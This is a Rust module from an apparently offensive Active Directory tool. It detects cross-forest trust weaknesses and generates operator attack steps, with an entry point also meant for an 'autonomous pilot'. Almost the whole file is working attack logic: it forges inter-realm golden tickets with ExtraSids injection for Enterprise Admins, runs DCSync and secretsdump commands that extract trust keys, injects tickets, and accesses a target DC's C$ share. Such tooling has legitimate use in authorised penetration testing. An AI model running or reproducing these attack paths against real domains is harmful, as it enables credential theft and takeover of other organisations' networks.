//! Cross-Forest Attack Analysis
//!
//! High-level orchestration of cross-forest/cross-domain attack techniques.
//! Uses existing trust enumeration data and surfaces concrete, actionable
//! attack paths.
//!
//! Key capabilities (all composable steps):
//! - **Opportunity detection**: analyse trust attributes to find where SID
//!   filtering is off, where selective auth is disabled, or where TGT
//!   delegation is enabled.
//! - **Inter-realm TGT guidance**: step-by-step instructions for forging a
//!   cross-forest golden ticket with SID History / ExtraSids injection.
//! - **Selective-auth bypass** detection and alternative attack paths.
//! - **Full orchestration** via `run_cross_forest_assessment`.

use crate::foreign::{ForeignMembership, TrustRelationship, analyze_foreign_memberships};
use crate::trust_map::{TrustEdge, TrustGraph, TrustKind};
use overthrone_reaper::runner::ReaperResult;
use serde::{Deserialize, Serialize};
use tracing::{info, warn};

// ─────────────────────────────────────────────────────────────
// Attack opportunity model
// ─────────────────────────────────────────────────────────────

/// A concrete cross-forest attack opportunity.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct CrossForestOpportunity {
    /// Source (compromised) domain FQDN.
    pub source_domain: String,
    /// Target (attack destination) domain FQDN.
    pub target_domain: String,
    /// Technique applicable for this opportunity.
    pub technique: CrossForestTechnique,
    /// Severity rating.
    pub severity: Severity,
    /// One-line description for reporting.
    pub description: String,
    /// Ordered steps to execute the attack.
    pub steps: Vec<String>,
    /// Whether SID filtering blocks this path.
    pub sid_filtering_blocks: bool,
}

/// Available cross-forest techniques.
#[derive(Debug, Clone, Serialize, Deserialize, PartialEq)]
pub enum CrossForestTechnique {
    /// Forge an inter-realm TGT with ExtraSids (PAC SID-History injection).
    SidHistoryGoldenTicket,
    /// TGT delegation is enabled — use S4U2Proxy across the trust boundary.
    TgtDelegationAbuse,
    /// External trust with SID filtering disabled (rare misconfig).
    ExternalTrustNoFilter,
    /// Selective authentication not configured — any authenticated user can access.
    NoSelectiveAuth,
    /// Privileged foreign user in a local privileged group.
    ForeignPrivilegedMembership {
        principal: String,
        local_group: String,
    },
    /// PAM (Privileged Access Management) trust — shadow principal abuse.
    PamTrustAbuse,
}

impl std::fmt::Display for CrossForestTechnique {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Self::SidHistoryGoldenTicket => write!(f, "SID-History Golden Ticket"),
            Self::TgtDelegationAbuse => write!(f, "TGT Delegation Abuse"),
            Self::ExternalTrustNoFilter => write!(f, "External Trust — No SID Filtering"),
            Self::NoSelectiveAuth => write!(f, "Selective Auth Disabled"),
            Self::ForeignPrivilegedMembership {
                principal,
                local_group,
            } => {
                write!(
                    f,
                    "Foreign Principal ({principal}) in privileged group ({local_group})"
                )
            }
            Self::PamTrustAbuse => write!(f, "PAM Trust Shadow-Principal Abuse"),
        }
    }
}

/// Simple severity enum.
#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq, PartialOrd, Ord)]
pub enum Severity {
    Informational,
    Low,
    Medium,
    High,
    Critical,
}

impl std::fmt::Display for Severity {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        let s = match self {
            Self::Informational => "INFO",
            Self::Low => "LOW",
            Self::Medium => "MEDIUM",
            Self::High => "HIGH",
            Self::Critical => "CRITICAL",
        };
        write!(f, "{s}")
    }
}

// ─────────────────────────────────────────────────────────────
// Opportunity detection
// ─────────────────────────────────────────────────────────────

/// Analyse a trust graph and foreign memberships and return all cross-forest
/// attack opportunities sorted by severity (most critical first).
pub fn find_cross_forest_opportunities(
    trust_graph: &TrustGraph,
    foreign_memberships: &[ForeignMembership],
) -> Vec<CrossForestOpportunity> {
    let mut opps: Vec<CrossForestOpportunity> = Vec::new();

    // ── Foreign privileged memberships ──
    for fm in foreign_memberships.iter().filter(|m| m.is_privileged_group) {
        opps.push(CrossForestOpportunity {
            source_domain: fm.foreign_domain.clone(),
            target_domain: fm.local_domain.clone(),
            technique: CrossForestTechnique::ForeignPrivilegedMembership {
                principal: fm.foreign_principal.clone(),
                local_group: fm.local_group.clone(),
            },
            severity: Severity::Critical,
            description: format!(
                "Foreign principal '{}' ({}) is a member of privileged local group '{}'",
                fm.foreign_principal, fm.foreign_domain, fm.local_group
            ),
            steps: vec![
                format!(
                    "Compromise the account '{}/{}' (phishing, spray, etc.)",
                    fm.foreign_domain, fm.foreign_principal
                ),
                format!(
                    "Use account as member of '{}' in {}",
                    fm.local_group, fm.local_domain
                ),
                "Escalate within the local domain using the inherited privileges.".to_string(),
            ],
            sid_filtering_blocks: false,
        });
    }

    // ── Trust edge analysis ──
    for trust in &trust_graph.trusts {
        if !trust.direction.allows_outbound() {
            continue; // skip inbound-only trusts (we can't leverage them outbound)
        }

        // SID History / inter-realm TGT (requires DA in source for trust key)
        if !trust.sid_filtering {
            let severity = if trust.is_within_forest {
                Severity::Critical
            } else {
                Severity::High
            };

            opps.push(CrossForestOpportunity {
                source_domain: trust.source_domain.clone(),
                target_domain: trust.target_domain.clone(),
                technique: CrossForestTechnique::SidHistoryGoldenTicket,
                severity,
                description: format!(
                    "SID filtering DISABLED on {} → {} trust — inter-realm TGT with ExtraSids can escalate to target Enterprise Admins",
                    trust.source_domain, trust.target_domain
                ),
                steps: build_sid_history_steps(trust),
                sid_filtering_blocks: false,
            });
        }

        // TGT delegation enabled — eligible for S4U2Proxy across trust
        if trust.tgt_delegation && trust.sid_filtering {
            opps.push(CrossForestOpportunity {
                source_domain: trust.source_domain.clone(),
                target_domain: trust.target_domain.clone(),
                technique: CrossForestTechnique::TgtDelegationAbuse,
                severity: Severity::Medium,
                description: "TGT delegation enabled with SID filtering — S4U2Proxy may allow cross-trust delegation abuse".to_string(),
                steps: vec![
                    "Find a service account with constrained delegation configured across the trust.".to_string(),
                    format!("Run S4U2Self + S4U2Proxy to impersonate a privileged user in {}", trust.target_domain),
                    "Use the issued service ticket to access target resources.".to_string(),
                ],
                sid_filtering_blocks: false,
            });
        }

        // Selective auth disabled on forest trust
        if !trust.sid_filtering && trust.trust_type == TrustKind::Forest {
            opps.push(CrossForestOpportunity {
                source_domain: trust.source_domain.clone(),
                target_domain: trust.target_domain.clone(),
                technique: CrossForestTechnique::NoSelectiveAuth,
                severity: Severity::Medium,
                description: format!(
                    "Forest trust {} ↔ {} has no selective authentication — any authenticated user can access all resources",
                    trust.source_domain, trust.target_domain
                ),
                steps: vec![
                    "Obtain any valid credential in the source domain.".to_string(),
                    format!("Access target domain ({}) resources directly via SMB/RPC.", trust.target_domain),
                    "Look for readable shares, LDAP null sessions, or kerberoastable SPNs.".to_string(),
                ],
                sid_filtering_blocks: false,
            });
        }

        // External trust with no SID filtering (rare misconfig)
        if trust.trust_type == TrustKind::External && !trust.sid_filtering {
            opps.push(CrossForestOpportunity {
                source_domain: trust.source_domain.clone(),
                target_domain: trust.target_domain.clone(),
                technique: CrossForestTechnique::ExternalTrustNoFilter,
                severity: Severity::High,
                description: format!(
                    "External trust to {} with SID filtering DISABLED — SID history injection possible",
                    trust.target_domain
                ),
                steps: build_sid_history_steps(trust),
                sid_filtering_blocks: false,
            });
        }
    }

    // Sort: highest severity first
    opps.sort_by(|a, b| b.severity.cmp(&a.severity));
    opps
}

/// Build ordered steps for the inter-realm TGT / SID-History attack.
fn build_sid_history_steps(trust: &TrustEdge) -> Vec<String> {
    vec![
        format!(
            "1. Obtain Domain Admin in '{}' — needed to DCSync the trust key (krbtgt/{}@{}).",
            trust.source_domain, trust.target_domain, trust.source_domain
        ),
        format!(
            "2. Run: overthrone forge --mode interrealm \\\n   --domain {} --domain-sid <SOURCE_SID> \\\n   --krbtgt-aes256 <TRUST_KEY_HEX> \\\n   --target-domain {} \\\n   --extra-sids <TARGET_EA_SID>",
            trust.source_domain, trust.target_domain
        ),
        "3. Inject the .kirbi via: overthrone ticket --inject golden.kirbi".to_string(),
        format!(
            "4. Access target resources: dir \\\\dc01.{}\\C$",
            trust.target_domain.to_lowercase()
        ),
    ]
}

// ─────────────────────────────────────────────────────────────
// Trust key extraction guidance
// ─────────────────────────────────────────────────────────────

/// Detailed guidance for extracting trust key credentials via DCSync.
///
/// This generates the operator commands needed before forging an inter-realm TGT.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct TrustKeyGuidance {
    pub source_domain: String,
    pub target_domain: String,
    pub dcsync_command: String,
    pub secretsdump_command: String,
    pub notes: Vec<String>,
}

pub fn build_trust_key_guidance(
    source_domain: &str,
    dc_ip: &str,
    target_domain: &str,
) -> TrustKeyGuidance {
    // Trust key credential name: krbtgt/TARGET_NETBIOS@SOURCE
    let trust_upn = format!(
        "{}$",
        target_domain
            .split('.')
            .next()
            .unwrap_or(target_domain)
            .to_uppercase()
    );

    TrustKeyGuidance {
        source_domain: source_domain.to_string(),
        target_domain: target_domain.to_string(),
        dcsync_command: format!(
            "overthrone secrets --dc-ip {dc_ip} --domain {src} --dcsync-target \"{trust_upn}\"",
            dc_ip = dc_ip,
            src = source_domain,
            trust_upn = trust_upn,
        ),
        secretsdump_command: format!(
            "secretsdump.py -just-dc-user '{trust_upn}' 'DOMAIN/admin@{dc_ip}'",
            trust_upn = trust_upn,
            dc_ip = dc_ip,
        ),
        notes: vec![
            format!("Trust key account: '{trust_upn}' in {source_domain}"),
            "The trust key is the RC4/AES key for krbtgt/TARGET — different from the regular krbtgt hash.".to_string(),
            "Requires Domain Admin (or DCSync permission) in the source domain.".to_string(),
            "Once obtained, use it as --krbtgt-hash / --krbtgt-aes256 in the interrealm forge.".to_string(),
        ],
    }
}

// ─────────────────────────────────────────────────────────────
// SID History injection guidance
// ─────────────────────────────────────────────────────────────

/// Guidance for building the ExtraSids list for a cross-forest golden ticket.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ExtraSidsGuidance {
    /// Enterprise Admins SID for the target domain  (S-1-5-21-<target>-519)
    pub enterprise_admins_sid: String,
    /// Domain Admins SID for the target domain  (S-1-5-21-<target>-512)
    pub domain_admins_sid: String,
    /// Schema Admins SID for the target domain  (S-1-5-21-<target>-518)
    pub schema_admins_sid: String,
    /// How to get the target domain SID if not known.
    pub sid_discovery_command: String,
}

pub fn build_extra_sids_guidance(
    target_domain: &str,
    target_domain_sid: Option<&str>,
) -> ExtraSidsGuidance {
    let placeholder = if let Some(sid) = target_domain_sid {
        sid.to_string()
    } else {
        format!("S-1-5-21-<{target_domain}-SID>")
    };

    ExtraSidsGuidance {
        enterprise_admins_sid: format!("{placeholder}-519"),
        domain_admins_sid: format!("{placeholder}-512"),
        schema_admins_sid: format!("{placeholder}-518"),
        sid_discovery_command: format!(
            "overthrone reaper --dc-ip <{target_domain} DC> --domain {target_domain} --whoami --show-domain-sid\n\
             # OR\n\
             ldapsearch -x -H ldap://<DC IP> -b '' '(objectclass=domain)' objectSid"
        ),
    }
}

// ─────────────────────────────────────────────────────────────
// Full orchestration
// ─────────────────────────────────────────────────────────────

/// Complete cross-forest assessment result.
#[derive(Debug)]
pub struct CrossForestAssessment {
    /// Domain the assessment started from.
    pub source_domain: String,
    /// All discovered trust relationships.
    pub trusts: Vec<TrustRelationship>,
    /// Foreign principal memberships (cross-domain).
    pub foreign_memberships: Vec<ForeignMembership>,
    /// Discovered attack opportunities, severity-descending.
    pub opportunities: Vec<CrossForestOpportunity>,
    /// Trust-key extraction guidance per outbound trust.
    pub key_guidance: Vec<TrustKeyGuidance>,
}

impl CrossForestAssessment {
    /// Print a compact human-readable summary to stderr via tracing.
    pub fn log_summary(&self) {
        info!(
            "[cross-forest] Assessment for {}: {} trusts | {} opportunities",
            self.source_domain,
            self.trusts.len(),
            self.opportunities.len(),
        );
        for (i, opp) in self.opportunities.iter().enumerate() {
            let blocked = if opp.sid_filtering_blocks {
                " [SID-FILTERED]"
            } else {
                ""
            };
            info!(
                "[cross-forest] #{}: [{}]{} {} → {}",
                i + 1,
                opp.severity,
                blocked,
                opp.source_domain,
                opp.technique,
            );
        }
        if !self.foreign_memberships.is_empty() {
            let priv_count = self
                .foreign_memberships
                .iter()
                .filter(|m| m.is_privileged_group)
                .count();
            info!(
                "[cross-forest] {} foreign principal memberships ({} in privileged groups)",
                self.foreign_memberships.len(),
                priv_count,
            );
        }
    }
}

/// Run a full cross-forest assessment using reaper output + trust graph.
///
/// This is the main entry point for CLI integration and the autonomous pilot.
pub async fn run_cross_forest_assessment(
    source_domain: &str,
    dc_ip: &str,
    reaper: &ReaperResult,
    trust_graph: &TrustGraph,
) -> CrossForestAssessment {
    info!(
        "[cross-forest] Starting assessment for {} (DC: {})",
        source_domain, dc_ip
    );

    // Live trust enumeration
    let trusts = match crate::foreign::enumerate_trusts(source_domain, dc_ip).await {
        Ok(t) => {
            info!("[cross-forest] Enumerated {} live trust(s)", t.len());
            t
        }
        Err(e) => {
            warn!("[cross-forest] Trust enumeration failed: {e} — using reaper data only");
            Vec::new()
        }
    };

    // Foreign membership analysis (works offline from reaper data)
    let foreign_memberships = analyze_foreign_memberships(source_domain, &reaper.groups);

    // Opportunity detection
    let opportunities = find_cross_forest_opportunities(trust_graph, &foreign_memberships);

    // Trust key guidance for outbound trusts where we know the target
    let key_guidance = trust_graph
        .trusts
        .iter()
        .filter(|t| t.direction.allows_outbound())
        .map(|t| build_trust_key_guidance(source_domain, dc_ip, &t.target_domain))
        .collect();

    let assessment = CrossForestAssessment {
        source_domain: source_domain.to_string(),
        trusts,
        foreign_memberships,
        opportunities,
        key_guidance,
    };

    assessment.log_summary();
    assessment
}
